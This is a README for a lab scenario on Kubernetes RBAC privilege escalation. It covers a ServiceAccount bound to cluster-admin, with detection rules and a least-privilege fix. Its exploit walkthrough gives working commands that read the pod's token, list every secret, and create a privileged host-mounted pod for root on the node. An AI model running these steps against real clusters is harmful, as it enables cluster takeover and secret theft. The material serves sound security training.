# Scenario 01 — RBAC Privilege Escalation

| | |
|---|---|
| **Vuln class** | Identity & Access Management / RBAC misconfiguration |
| **Difficulty** | ⭐ Easy (start here) |
| **Backends** | kind ✅  AKS ✅ (identical behavior) |
| **Namespace** | `rbac-esc` |
| **MITRE ATT&CK for Containers** | [T1078 Valid Accounts](https://attack.mitre.org/techniques/T1078/), [TA0004 Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) |

## What it is
A namespaced application `ServiceAccount` (`app-sa`) is bound — via a
`ClusterRoleBinding` — to the built-in **`cluster-admin`** ClusterRole. The app
pod looks mundane, but its mounted token is a cluster-admin credential.

## Why it matters
`cluster-admin` is unrestricted root over the entire cluster. Binding it to a
workload SA means any code execution in that pod (RCE, a malicious dependency,
or an attacker who can `kubectl exec`) instantly owns every namespace, every
secret, and every node. This is one of the most common real-world Kubernetes
findings — over-broad `roleRef`s and copy-pasted "make it work" bindings.

## Deploy just this scenario
```powershell
kubectl apply -f scenarios/01-rbac-privilege-escalation/manifest.yaml
# or:  ./reset.ps1 -Scenarios 01-rbac-privilege-escalation
```

## Exploit walkthrough
Simulate an attacker who has landed inside the `web` pod (e.g. via RCE).

```powershell
# 1. Get a shell in the app pod (stands in for "attacker has code exec").
$pod = kubectl -n rbac-esc get pod -l app=web -o jsonpath='{.items[0].metadata.name}'
kubectl -n rbac-esc exec -it $pod -- sh
```
Inside the pod, `kubectl` does **not** automatically read the projected service-account token as its client configuration. Pass the token and in-cluster API endpoint explicitly:
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"

# 2. Confirm the compromised workload identity has cluster-wide authority.
kubectl --server="$SERVER" --certificate-authority="$CA" --token="$TOKEN" \
  auth can-i '*' '*' --all-namespaces

# 3. Read a cluster-scoped collection it should never access.
kubectl --server="$SERVER" --certificate-authority="$CA" --token="$TOKEN" \
  get secrets -A

# 4. Pivot: create a privileged pod with the stolen workload token.
kubectl --server="$SERVER" --certificate-authority="$CA" --token="$TOKEN" \
  apply -f - <<'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: pwn
  namespace: rbac-esc
spec:
  hostPID: true
  containers:
  - name: pwn
    image: alpine:3.20
    command: ["sleep","infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - { name: host, mountPath: /host }
  volumes:
  - name: host
    hostPath: { path: / }
YAML
# 5. From that pod: chroot /host  -> you are root on the node.
```

### Alternative: escalate WITHOUT a pre-existing admin token
An identity with overly broad `bind` or `escalate` permissions may be able to
grant itself more power. This is a separate RBAC defect; the manifest here
demonstrates the direct over-permissive binding:
```bash
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin \
  --serviceaccount=rbac-esc:app-sa
```

## What success looks like
- `kubectl auth can-i '*' '*' --all-namespaces` prints **`yes`**.
- You can read `kube-system` secrets and create pods in namespaces the app
  should never touch.
- The `pwn` pod gives you a root shell on a node's filesystem via `chroot /host`.

## Detection
- **Audit log** (policy in `tooling/audit/audit-policy.yaml`): look for
  `create`/`update` on `clusterrolebindings` and any binding whose `roleRef`
  is `cluster-admin`. Exec into the pod shows as `pods/exec` at RequestResponse.
- **Falco** (installed by `tooling/install.ps1`): rules *"Attach/Exec Pod"* and *"K8s ClusterRoleBinding
  Created"* fire. Reading many secrets triggers *"Contact K8S API Server From
  Container"*.
- **kubescape / kube-bench**: flag `cluster-admin` bindings to non-system SAs.

Quick manual audit:
```powershell
kubectl get clusterrolebindings -o json |
  ConvertFrom-Json | ForEach-Object { $_.items } |
  Where-Object { $_.roleRef.name -eq 'cluster-admin' } |
  Select-Object { $_.metadata.name }, { $_.subjects }
```

## Remediation
Grant least privilege: a namespaced `Role` with only the verbs/resources the
app needs, bound with a `RoleBinding` (not Cluster-wide). Never bind
`cluster-admin` to a workload SA. Set `automountServiceAccountToken: false`
where a pod doesn't call the API.

**Before (vulnerable):**
```yaml
kind: ClusterRoleBinding
roleRef: { kind: ClusterRole, name: cluster-admin }
subjects: [{ kind: ServiceAccount, name: app-sa, namespace: rbac-esc }]
```
**After (fixed):**
```yaml
kind: Role
metadata: { namespace: rbac-esc, name: app-reader }
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    verbs: ["get", "list"]
---
kind: RoleBinding
metadata: { namespace: rbac-esc, name: app-reader-binding }
roleRef: { kind: Role, name: app-reader, apiGroup: rbac.authorization.k8s.io }
subjects: [{ kind: ServiceAccount, name: app-sa, namespace: rbac-esc }]
```

## Suggested order
Do this **first**. It teaches how SA tokens work and sets up the pivot pattern
(privileged pod) reused by Scenario 02.
